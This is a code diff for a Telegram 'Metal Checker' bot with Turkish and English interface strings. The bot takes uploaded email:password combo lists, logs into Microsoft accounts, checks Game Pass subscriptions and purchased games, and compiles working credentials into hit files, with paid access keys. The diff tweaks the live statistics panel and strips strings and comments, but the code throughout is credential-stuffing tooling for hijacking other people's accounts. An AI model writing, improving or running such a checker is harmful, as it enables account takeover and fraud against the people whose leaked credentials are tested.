@@ -69,17 +69,7 @@ LANG = {
         "btn_stats": "📊 İstatistiklerim",
         "btn_admin": "👑 Admin Paneli",
         "btn_lang": "🌐 Dil Değiştir (Language)",
-        "force_join": "❌ *Erişim Reddedildi!*\n\nBotu kullanabilmek için aşağıdaki kanallara katılmanız gerekmektedir:",
-        "btn_joined": "✅ Katıldım",
-        "no_key": "🔑 *Aktif bir üyeliğiniz bulunmuyor veya süresi bitmiş!* \nLütfen bir key girin veya kurucu ile iletişime geçin.",
-        "key_success": "🎉 Başarılı! Üyeliğiniz tanımlandı: *{}*",
-        "invalid_key": "❌ Geçersiz veya kullanılmış anahtar!",
-        "send_combo": "📂 Lütfen taratmak istediğiniz combo listenizi (`.txt` formatında) gönderin.",
-        "merge_start": "📂 *Dosya Birleştirme Modu*\nLütfen birleştirmek istediğiniz `.txt` dosyalarını gönderin. Bitirdiğinizde /done yazın.",
-        "invalid_file": "❌ Sadece `.txt` dosyaları kabul edilmektedir.",
-        "stats_template": "📊 *İstatistikleriniz*\n\n👤 Kullanıcı ID: `{user_id}`\n📅 Üyelik: {tier}\n📅 Bitiş: {expiry}\n\n✅ Toplam Tarama: {scans}\n💎 Toplam Hit: {hits}",
         "scan_started": "🚀 Tarama başlatıldı! Canlı panel anlık olarak akacaktır. Durdurmak için /stop yazabilirsiniz.",
-        "scan_stopped": "🛑 Tarama kullanıcı tarafından durduruldu!"
     },
     "en": {
         "welcome": "👋 *Welcome to Metal Checker Bot!* \n\nPlease choose a language to continue:",
@@ -89,17 +79,7 @@ LANG = {
         "btn_stats": "📊 My Statistics",
         "btn_admin": "👑 Admin Panel",
         "btn_lang": "🌐 Change Language",
-        "force_join": "❌ *Access Denied!*\n\nYou must join channels to use the bot:",
-        "btn_joined": "✅ Checked",
-        "no_key": "🔑 *No active subscription found!*",
-        "key_success": "🎉 Success! Activated: *{}*",
-        "invalid_key": "❌ Invalid key!",
-        "send_combo": "📂 Please send your combo list (.txt).",
-        "merge_start": "📂 Send files to merge, type /done when finished.",
-        "invalid_file": "❌ Only .txt allowed.",
-        "stats_template": "📊 *Stats*\nUser: `{user_id}`\nTier: {tier}\nScans: {scans}",
         "scan_started": "🚀 Scan started! Dashboard is updating live. Send /stop to abort.",
-        "scan_stopped": "🛑 Scan stopped!"
     }
 }
 
@@ -216,7 +196,6 @@ def check_entitlements(session, mc_token):
                     days_left_str = f" ({diff}G Kaldı)" if diff > 0 else " (Süresi Bitmiş)"
                 except: pass
 
-            # Detaylı Filtreleme Matrisi
             if 'product_game_pass_ultimate' in text_lower or 'ultimate' in text_lower: found_subs.append(f"Game Pass Ultimate💎{days_left_str}")
             elif 'product_game_pass_pc' in text_lower or 'pc_game_pass' in text_lower: found_subs.append(f"Game Pass PC💻{days_left_str}")
             elif 'essential' in text_lower: found_subs.append(f"Game Pass Essential🟢{days_left_str}")
@@ -286,9 +265,8 @@ class BotScanContext:
         self.bad = 0
         self.twofa = 0
         self.errors = 0
-        self.retries = 0
 
-        # --- 25+ TÜM ABONELİKLERİN ANLIK LIVE PANEL SAYAÇLARI ---
+        # Canlı Panel Sayaçları
         self.gp_ultimate = 0
         self.gp_pc = 0
         self.gp_essential = 0
@@ -365,13 +343,11 @@ def check_account_bot(context, combo):
         account_type, subs = check_entitlements(session, mc_token)
         purchased_games = get_payment_transactions(session, ms_token)
 
-        # Filtre Kontrolü
         if context.filter_str != "skip":
             if not any(context.filter_str in g.lower() for g in purchased_games):
                 with context.lock: context.checked += 1
                 return
 
-        # --- ŞARTLI DOSYA DÖKÜM VE AYIKLAMA SİSTEMİ ---
         has_premium_sub = len(subs) > 0
         has_any_game = len(purchased_games) > 0
 
@@ -383,28 +359,20 @@ def check_account_bot(context, combo):
 
         with context.lock:
             context.checked += 1
-            
-            # EĞER HİÇBİR ŞEY YOKSA -> SADECE NOT LINKED'E GİDER
             if not has_premium_sub and not has_any_game:
                 context.not_linked_list.append(capture_detail)
             else:
                 context.hits += 1
                 context.hit_list.append(f"{email}:{password}")
                 
-                # Yalnızca Oyun Varsa purchased_items.txt'ye Girer!
                 if has_any_game:
                     games_str = "\n".join([f"{i} - {g}" for i, g in enumerate(purchased_games, 1)])
                     context.purchased_items_list.append(f"Email: {email}\nPassword: {password}\nGamesList:\n{games_str}\n— Checker by Icardi\n{'='*50}\n")
-                else:
-                    # Aboneliği var ama oyunu yoksa yine de boş görünmesin diye not_linked dışı tutulur
-                    pass
 
-                # Yalnızca Abonelik Varsa Subscriptions.txt'ye Girer!
                 if has_premium_sub:
                     sub_entry = f"Email: {email} | Pass: {password}\nActive Subscriptions:\n" + "\n".join([f" ➡️ {sb}" for sb in subs]) + f"\n{'-'*40}\n"
                     context.subscriptions_list.append(sub_entry)
 
-            # --- PANEL SAYAÇLARINI ANLIK ARTTIRMA ---
             if account_type and 'Minecraft' in account_type: context.minecraft_java += 1
             for s in subs:
                 sl = s.lower()
@@ -436,17 +404,17 @@ def check_account_bot(context, combo):
         with context.lock: context.errors += 1; context.checked += 1
         trigger_live_update(context)
 
-def trigger_live_update(context):
-    """Kısıtlamalara takılmadan anlık panel yenileyici"""
+def trigger_live_update(context, force=False):
+    """Anlık sıfır gecikmeli panel basıcı"""
     current = time.time()
-    if current - context.last_update_time < 0.8: return 
+    # İlk başlangıçta veya hit geldiğinde bekleme yapmadan direkt basar
+    if not force and (current - context.last_update_time < 0.7): return 
     context.last_update_time = current
     
     pct = (context.checked / context.total) * 100 if context.total > 0 else 0
     
-    # 25 Popüler Aboneliğin Eksiksiz Gösterildiği Dev Liste
     text = (
-        f"⚡ *METAL CHECKER ANLIK PANEL v4.5* ⚡\n"
+        f"⚡ *METAL CHECKER ANLIK PANEL v4.6* ⚡\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🟢 Hit (Oyun/Sub'lı): `{context.hits}`\n"
         f"🔴 Hatalı (Bad): `{context.bad}`\n"
@@ -488,7 +456,6 @@ def complete_scan_loop(context):
     
     safe_bot_call(bot.send_message, context.chat_id, "📦 *Tarama bitti! Dosyalarınız temizlenerek oluşturuluyor...*", parse_mode="Markdown")
     
-    # Şartlı gönderim listesi
     if context.purchased_items_list:
         bio = io.BytesIO("\n".join(context.purchased_items_list).encode('utf-8'))
         bio.name = "purchased_items.txt"
@@ -561,8 +528,11 @@ def handle_all(message):
         context = BotScanContext(chat_id, user_id, combos, filter_str=game_filter)
         active_scans[chat_id] = context
 
-        init_msg = safe_bot_call(bot.send_message, chat_id, get_text(user_id, "scan_started"), reply_markup=main_keyboard(user_id), parse_mode="Markdown")
-        if init_msg: context.message_id = init_msg.message_id
+        # EKALAN GÜNCELLEMESİ: .txt bota düştüğü an, hiç beklemeden boş şablon paneli basıyoruz!
+        init_msg = safe_bot_call(bot.send_message, chat_id, "⏳ Panel hazırlanıyor...", reply_markup=main_keyboard(user_id))
+        if init_msg: 
+            context.message_id = init_msg.message_id
+            trigger_live_update(context, force=True) # Anında tetikleme
 
         threading.Thread(target=complete_scan_loop, args=(context,), daemon=True).start()
         
